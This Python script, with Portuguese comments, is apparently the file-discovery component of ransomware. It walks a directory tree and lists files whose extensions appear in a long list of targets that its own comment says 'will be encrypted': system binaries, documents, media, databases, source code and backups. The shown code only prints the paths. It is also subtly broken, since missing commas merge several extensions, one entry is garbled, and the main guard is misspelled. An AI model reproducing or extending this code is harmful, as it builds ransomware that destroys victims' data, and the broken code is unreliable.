#!/usr/bin/python3.10
import os

def discovery(initial_path):

    # tipos de arquivos que serao criptografados
    extensions = [
         'exe','dll','so','rpm','deb','vmlinuz','img #Arquivos do sistema'
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw'  # imagens
                                                          'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma',
        'aiff', 'ape',  # Audios
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # videos
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # microsoft office
        # OpenOffice, Adobe, Latex, Markdown, etc
        'odt', 'odp', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
        'yml', 'yaml', 'json', 'xml', 'csv',  # dados estruturados e config
        'db', 'sql', 'dbf', 'mdb', 'iso',  # bancos de dados e imagens de discos

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsṕ', 'css'  # tecnologias web
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
        # Código fonte C e C++
        'java', 'class', 'jar'  # Código fonte Java

        'ps', 'bat', 'vb', # Scripts de Sistemas windows
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # Scripts de Sistemas Unix
        'go', 'py', 'pyc', 'bf', 'coffee',  # Outros tipos de codigos fontes

        'zip', 'tar', 'tgz', '7z', 'rar', 'bak',  # Arquivos compactados e backups
    ]

    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            asbpath = os.path.abspath(os.path.join(dirpath,_file))
            ext = asbpath.split('.')[-1]
            if ext in extensions:
                yield asbpath

if __name__ == '_main_':
    x = discovery(os.getcwd())
    for i in x:
        print(i)

        
